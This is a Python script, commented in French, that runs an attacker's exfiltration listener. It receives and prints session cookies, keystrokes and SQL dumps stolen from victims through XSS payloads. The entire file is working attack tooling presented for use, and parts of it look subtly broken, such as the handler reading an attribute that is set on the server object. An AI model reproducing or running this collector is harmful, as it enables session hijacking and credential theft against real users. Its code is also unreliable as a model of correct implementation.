#!/usr/bin/env python3
"""
🍪 Serveur d'exfiltration — Écoute sur IP RÉELLE de l'attaquant
Reçoit cookies XSS vers TA machine (pas vers la victime)
"""

import threading
import http.server
import socketserver
import urllib.parse
from colorama import Fore, Style

class ExfilServer:
    def __init__(self, port=8888):
        self.port = port
        self.captured = []
    
    def start(self):
        """Démarre le serveur sur TOUTES les interfaces (0.0.0.0) → accessible via IP locale"""
        
        class Handler(http.server.SimpleHTTPRequestHandler):
            def stop(self):
                """Arrêter proprement le serveur"""
                pass  # Le serveur s'arrête automatiquement en daemon
            
            def do_GET(self):
                # Capture cookies XSS
                if 'cookie=' in self.path:
                    cookie = urllib.parse.unquote(self.path.split('cookie=')[1].split('&')[0])
                    print(f"\n{Fore.RED}[🔥 COOKIE VOLÉ] {Style.RESET_ALL}{cookie}")
                    self.server_instance.captured.append({'type': 'xss_cookie', 'data': cookie})
                
                # Capture keystrokes
                if 'key=' in self.path:
                    key = urllib.parse.unquote(self.path.split('key=')[1].split('&')[0])
                    print(f"{Fore.MAGENTA}[⌨️ KEYSTROKE] {Style.RESET_ALL}{key}")
                    self.server_instance.captured.append({'type': 'key', 'data': key})
                
                # Capture SQL dump
                if 'dump=' in self.path:
                    dump = urllib.parse.unquote(self.path.split('dump=')[1].split('&')[0])
                    print(f"{Fore.CYAN}[💾 SQL DUMP] {Style.RESET_ALL}{dump[:100]}...")
                    self.server_instance.captured.append({'type': 'sql_dump', 'data': dump})
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
            
            def log_message(self, format, *args):
                pass
        
        try:
            server = socketserver.TCPServer(("0.0.0.0", self.port), Handler)  # ← Écoute sur TOUTES les interfaces
            server.server_instance = self
            
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            print(f"\n{Fore.GREEN}[✓] {Style.RESET_ALL}Serveur exfiltration actif sur PORT {self.port}")
            print(f"{Fore.YELLOW}[!] {Style.RESET_ALL}Les cookies volés arriveront EN DIRECT dans ce terminal\n")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] {Style.RESET_ALL}Échec démarrage serveur: {e}")
            return False
    
    def stop(self):
        """Arrêter proprement le serveur"""
        pass  # Le serveur s'arrête automatiquement en daemon